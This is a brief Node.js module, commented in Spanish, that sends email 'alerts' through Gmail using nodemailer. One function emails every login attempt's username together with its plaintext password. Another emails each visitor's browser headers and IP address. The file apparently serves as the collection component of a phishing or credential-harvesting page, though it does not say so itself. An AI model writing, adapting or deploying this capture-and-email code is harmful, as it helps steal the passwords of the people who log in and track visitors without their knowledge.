const nodemailer = require("nodemailer");
require("dotenv").config();

// configuracion nodmeailer email
var transporter=nodemailer.createTransport({
    service:'gmail',
    auth:{
      user:process.env.MAILUSER,
      pass:process.env.MAILPASS
    }
  })

const destinatario = process.env.ALERT_EMAIL;

// Función para enviar alertas por correo electrónico
async function enviarCorreo(asunto, mensaje) {
    try {
        await transporter.sendMail({
            from: process.env.SMTP_USER,
            to: destinatario,
            subject: asunto,
            text: mensaje,
        });
        console.log("Correo de alerta enviado con éxito");
    } catch (error) {
        console.error("Error al enviar el correo:", error);
    }
}

// Función para alertar sobre intentos de inicio de sesión
async function alertarInicioSesion(usuario, contraseña) {
    const mensaje = `⚠️ Nuevo intento de inicio de sesión ⚠️\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contraseña}`;
    await enviarCorreo("Alerta de Inicio de Sesión", mensaje);
}

// Función para alertar sobre la visita de un usuario
async function alertarVisita(headers) {
    const mensaje = `
⚠️ Nueva visita registrada ⚠️

🖥️ Información del visitante:
- User-Agent: ${headers["user-agent"] || "No disponible"}
- Accept-Language: ${headers["accept-language"] || "No disponible"}
- Referer: ${headers["referer"] || "No disponible"}
- Host: ${headers["host"] || "No disponible"}
- IP Address: ${headers["x-forwarded-for"] || "IP no disponible"}

🔍 Información adicional:
- Date: ${new Date().toLocaleString()}
`;
    await enviarCorreo("Alerta de Nueva Visita", mensaje);
}

module.exports = { alertarInicioSesion, alertarVisita };
